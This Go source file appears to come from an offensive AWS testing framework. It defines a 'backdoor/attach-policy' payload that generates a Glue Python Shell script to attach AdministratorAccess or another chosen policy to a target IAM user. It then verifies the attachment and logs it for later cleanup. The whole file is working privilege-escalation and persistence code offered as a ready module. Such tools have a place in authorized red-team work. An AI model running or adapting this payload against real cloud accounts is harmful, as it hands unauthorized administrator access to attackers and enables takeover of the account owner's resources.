package glue

import (
	"context"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a Glue Python Shell script that attaches
// AdministratorAccess (or a custom policy) to a specified IAM user.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an existing IAM user via Glue job"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to attach the policy to",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode produces a standalone Python script for Glue Python Shell execution.
// Parameters are passed as Glue job arguments (--TARGET_USER, --POLICY_ARN) and
// read via sys.argv parsing since getResolvedOptions requires the awsglue package.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := normalizeUserName(options["TARGET_USER"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	code := fmt.Sprintf(`import boto3
import sys

target_user = '%s'
policy_arn = '%s'

# Override from job arguments if provided
for i, arg in enumerate(sys.argv):
    if arg == '--TARGET_USER' and i + 1 < len(sys.argv):
        target_user = sys.argv[i + 1]
    if arg == '--POLICY_ARN' and i + 1 < len(sys.argv):
        policy_arn = sys.argv[i + 1]

# Handle ARN-style usernames
if target_user.startswith('arn:') and ':user/' in target_user:
    target_user = target_user.split(':user/')[-1]

iam = boto3.client('iam')

try:
    iam.attach_user_policy(
        UserName=target_user,
        PolicyArn=policy_arn
    )
    print(f"Successfully attached {policy_arn} to {target_user}")
except Exception as e:
    print(f"Error attaching policy: {e}")
    raise
`, targetUser, policyArn)

	return code, nil
}

// ProcessResult passes through the module's result string. Glue jobs don't return
// output to the caller -- the module verifies the effect by checking IAM state.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// VerifySuccess checks whether the target user has the attached policy.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	targetUser := normalizeUserName(options["TARGET_USER"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	iamClient := iam.NewFromConfig(config)
	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
		UserName: aws.String(targetUser),
	})
	if err != nil {
		return false, nil
	}

	for _, policy := range result.AttachedPolicies {
		if aws.ToString(policy.PolicyArn) == policyArn {
			return true, nil
		}
	}

	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetUser := normalizeUserName(options["TARGET_USER"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", targetUser, policyName),
			ARN:           policyArn,
			CleanupMethod: "iam:DetachUserPolicy",
			Metadata: map[string]string{
				"principal_type": "user",
				"principal_name": targetUser,
				"policy_arn":     policyArn,
			},
		},
	}
}

// normalizeUserName extracts the username from an IAM user ARN if provided.
func normalizeUserName(input string) string {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):]
		}
	}
	return input
}
